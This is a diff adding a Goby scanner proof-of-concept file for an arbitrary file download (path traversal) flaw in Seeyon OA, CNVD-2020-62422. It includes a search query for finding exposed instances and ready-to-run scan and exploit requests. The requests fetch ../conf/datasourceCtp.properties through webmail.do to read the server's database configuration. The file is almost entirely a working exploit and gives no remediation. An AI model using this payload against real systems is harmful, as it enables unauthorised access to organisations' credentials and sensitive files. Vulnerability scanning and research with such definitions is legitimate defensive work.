@@ -1,0 +1,78 @@
+{
+      "Name": "致远OA webmail.do任意文件下载 CNVD-2020-62422",
+      "Level": "2",
+      "Tags": [
+            "目录遍历"
+      ],
+      "GobyQuery": "app=\"Yonyou-Seeyon-OA\" || (app=\"致远互联-OA\" || app=\"Seeyon-Server\"|| app=\"用友-致远OA\" || (server=\"Seeyon-Server\") || (body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || body=\"/yyoa/\" || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\")))",
+      "Description": "致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息\n\nhttp://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties\n\n致远OA A6-V5\n致远OA A8-V5\n致远OA G6\n",
+      "Product": "致远OA",
+      "Homepage": "https://www.seeyon.com/",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "File",
+			"type": "select",
+			"value": "../conf/datasourceCtp.properties",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "workflow",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-01-25 22:53:12",
+      "GobyVersion": "1.8.230"
+}
